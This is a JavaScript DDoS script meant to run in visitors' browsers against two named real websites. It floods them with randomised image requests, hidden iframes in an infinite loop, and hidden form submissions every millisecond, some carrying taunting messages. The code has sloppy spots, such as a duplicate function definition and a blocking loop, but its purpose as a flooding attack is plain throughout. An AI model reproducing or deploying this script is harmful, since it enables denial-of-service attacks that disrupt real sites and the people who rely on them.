function imgflood() {  
  var TARGET = 'korea-dpr.com';
  var URI = '/index.html';
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http://'+TARGET+URI+rand+'=val';
}
setInterval(imgflood, 10);

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout(_DDoS("http://korea-dpr.com/"),10);
}



function FLOOD() {  
  var TARGET = 'jihadology.net';
  var URI = '/index.html';
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http://'+TARGET+URI+rand+'=val';
}
setInterval(FLOOD, 10);

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout(_DDoS("http://jihadology.net"),10);
}
function postWithoutAjax( url, params ){
    
    params = params || {};

    // function to remove the iframe
    var removeIframe = function( iframe ){
        iframe.parentElement.removeChild(iframe);
    };
    
    // make a iframe...
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    
    iframe.onload = function(){
        document = this.contentWindow.document;
        
        // Make a invisible form
        var form = document.createElement('form');
        form.method = 'get';
        form.action = url;
        document.body.appendChild(form);
        
        // pass the parameters
        for( var name in params ){
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = name;
            input.value = params[name];
            form.appendChild(input);
        }
        
        form.submit();
        // remove the iframe
        removeIframe(iframe);
    };
    
    document.body.appendChild(iframe);
}

setInterval(function(){
postWithoutAjax('http://korea-dpr.com/', 'Get outta here Kim JOn Un');
postWithoutAjax('http://jihadology.net/', 'ISIS is potato');
}, 1);
